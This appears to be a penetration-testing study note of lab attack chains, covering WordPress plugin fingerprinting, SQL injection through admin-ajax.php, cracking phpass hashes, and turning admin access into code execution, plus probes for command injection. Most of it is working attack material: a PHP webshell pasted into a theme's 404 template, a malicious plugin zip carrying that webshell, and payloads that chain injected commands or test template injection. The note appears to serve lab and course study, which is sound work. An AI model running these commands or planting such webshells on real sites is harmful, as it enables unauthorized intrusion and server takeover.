# Web Applications — Command Appendix

Part of [[COMMAND APPENDIX]]. CMS-specific attack chains and command injection diagnosis.

---

## WordPress

```bash
# Fingerprint installed plugin version (no auth needed)
curl http://<target>/wp-content/plugins/<plugin-name>/readme.txt
# Look for the "Stable tag:" line, then search for a matching public exploit
searchsploit <plugin name>

# Unauthenticated SQLi is common via admin-ajax.php, every plugin's AJAX actions route
# through this one shared endpoint regardless of login state
sqlmap -u "http://<target>/wp-admin/admin-ajax.php?action=<plugin_action>&<param>=1" -p <param> --batch --ignore-code=404

# Crack a dumped wp_users phpass hash ($P$... or $H$...) with John
echo 'admin:$P$<hash>' > wp_hash.txt
john --format=phpass --wordlist=/usr/share/wordlists/rockyou.txt wp_hash.txt

# Admin-to-RCE option 1: Appearance > Theme File Editor, paste into any template (e.g. 404.php)
<?php system($_GET['cmd']); ?>
# then trigger it by requesting a nonexistent URL (forces 404.php to render)
curl "http://<target>/nonexistent-page?cmd=id"

# Admin-to-RCE option 2 (use if option 1 fails with "Unable to communicate back with
# site, so the PHP change was reverted" — WP's fatal-error-protection loopback check
# failing, common on isolated lab networks): upload a malicious plugin zip instead,
# no loopback check happens at upload time
mkdir /tmp/shell && cat > /tmp/shell/shell.php << 'EOF'
<?php
/*
Plugin Name: shell
*/
system($_GET['cmd']);
EOF
cd /tmp && zip -r shell.zip shell
# Then in the dashboard: Plugins > Add New > Upload Plugin > shell.zip > Install > Activate
curl "http://<target>/?cmd=id"
```
*The plugin-upload webshell has no hook, so it runs on every single page load once activated, not just a specific route. Same `cmd`-parameter pattern as every other webshell in this vault, just delivered via plugin activation instead of file upload/SQLi/theme edit.*

See [[SQL Injection Attacks#🏆 Capstone Labs|Capstone Labs]] (Perfect Survey plugin, CVE-2021-24762) for the full worked walkthrough.

#### Tags: #WordPress #WPScan #PluginRCE #PhpassCracking #AdminAjax

---

## Command Injection Diagnosis

```bash
# Replace a command-shaped parameter value entirely with a harmless command
curl -X POST --data 'param=<harmless-command>' http://<target>/<endpoint>

# Chain a second command (URL-encoded ; or &&, CMD also accepts single &)
curl -X POST --data 'param=<expected-command>%3B<injected-command>' http://<target>/<endpoint>

# No command-shaped hint at all? Work through systematically:
curl -X POST --data 'param=1%2B1' http://<target>/<endpoint>       # eval()? expect "2"
curl -X POST --data 'param={{7*7}}' http://<target>/<endpoint>     # Jinja2 SSTI? expect "49"
curl -X POST --data-urlencode 'param=`id`' http://<target>/<endpoint>   # plain OS injection

# CMD vs PowerShell detection on Windows (credit: PetSerAl)
# (dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
```
See [[Common Web Application Attacks#9.4.1. OS Command Injection|9.4.1]] (both case studies, including the systematic diagnostic sequence from the capstone).

#### Tags: #CommandInjection #BlindCommandInjection #DiagnosticMethodology

---

## **Outstanding**
This area grows alongside the modules. Whenever a new CMS or web-app-specific attack chain comes up (Drupal, Joomla, Tomcat manager, etc), add it here with a link back to the source section.
